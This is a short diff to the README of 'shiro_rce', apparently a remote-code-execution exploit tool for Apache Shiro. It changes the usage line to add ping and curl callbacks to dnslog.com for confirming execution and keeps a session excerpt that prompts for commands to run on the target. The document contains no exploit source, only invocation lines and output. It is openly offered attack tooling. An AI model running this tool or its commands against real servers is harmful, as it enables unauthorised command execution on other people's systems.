@@ -1,8 +1,8 @@
 # shiro_rce
 
 ```
-java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx/  nslookup/ping nocheck
-nslookup/ping --> use nslookup dnslog.com check(default)./use ping dnslog.com check.
+java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx/  nslookup/ping1/ping2/curl nocheck
+nslookup/ping1/ping2/curl--> use nslookup dnslog.com check./use ping -c 1 dnslog.com check(default)./use ping -n 1 dnslog.com check./use curl dnslog.com check.
 nocheck --> skip check target is shiro or not.
 
 [admin@ shiro]java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx/          
@@ -57,6 +57,6 @@ nocheck --> skip check target is shiro or not.
 [-] please enter command, input q or quit to quit
 > quit
 [-] start process command: quit
-[-] exit
+[-] quit
 
 ```
